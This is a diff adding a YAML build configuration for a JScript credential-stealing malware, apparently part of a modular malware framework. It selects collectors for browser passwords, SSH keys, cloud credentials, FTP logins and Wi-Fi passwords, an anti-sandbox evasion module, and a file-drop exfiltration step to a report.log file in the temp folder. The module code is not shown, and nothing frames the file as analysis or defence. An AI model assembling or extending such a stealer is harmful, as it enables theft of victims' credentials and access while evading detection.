@@ -1,0 +1,25 @@
+name: js_infostealer_creds
+description: Lightweight credential-focused stealer (browser, SSH, FTP, cloud)
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/ftp_credentials
+  - collectors/wifi_passwords
+
+exfil: exfil/file_drop
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+
+vars:
+  DROP_PATH: "%TEMP%\\report.log"
+  EXFIL_FILENAME: "report.log"
